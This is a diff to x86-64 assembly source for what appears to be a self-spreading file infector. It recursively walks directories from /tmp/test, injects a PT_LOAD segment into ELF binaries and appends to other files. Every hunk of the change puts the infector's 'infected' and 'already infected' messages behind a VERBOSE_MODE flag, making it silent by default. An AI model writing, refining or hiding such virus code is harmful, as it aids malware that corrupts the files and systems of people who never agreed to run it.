@@ -87,7 +87,9 @@ _start:
     
     mov rsi, firstDir           ; source = /tmp/test
     lea rdi, [rel path_buffer]
+%ifdef VERBOSE_MODE
     call print_string
+%endif
     call str_copy
     lea rdi, [rel path_buffer]
     call list_files_recursive
@@ -1241,6 +1243,7 @@ add_pt_load:
     syscall
 
     ; Print infected message
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_infected]
     call print_string
     mov rdi, r12
@@ -1250,6 +1253,7 @@ add_pt_load:
     lea rsi, [rel newline]
     mov edx, 1
     syscall
+%endif
 
     jmp .add_pt_load_done
 
@@ -1365,8 +1369,10 @@ process_non_elf_file:
     mov edi, r13d
     syscall
 
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_already_infected]
     call print_string
+%endif
     jmp .process_done
 
 .process_close_and_append:
@@ -1399,6 +1405,7 @@ process_non_elf_file:
     mov edi, r13d
     syscall
 
+%ifdef VERBOSE_MODE
     lea rdi, [rel msg_infected]
     call print_string
     mov rdi, r12
@@ -1408,6 +1415,7 @@ process_non_elf_file:
     lea rsi, [rel newline]
     mov edx, 1
     syscall
+%endif
     jmp .process_done
 
 .process_write_failed:
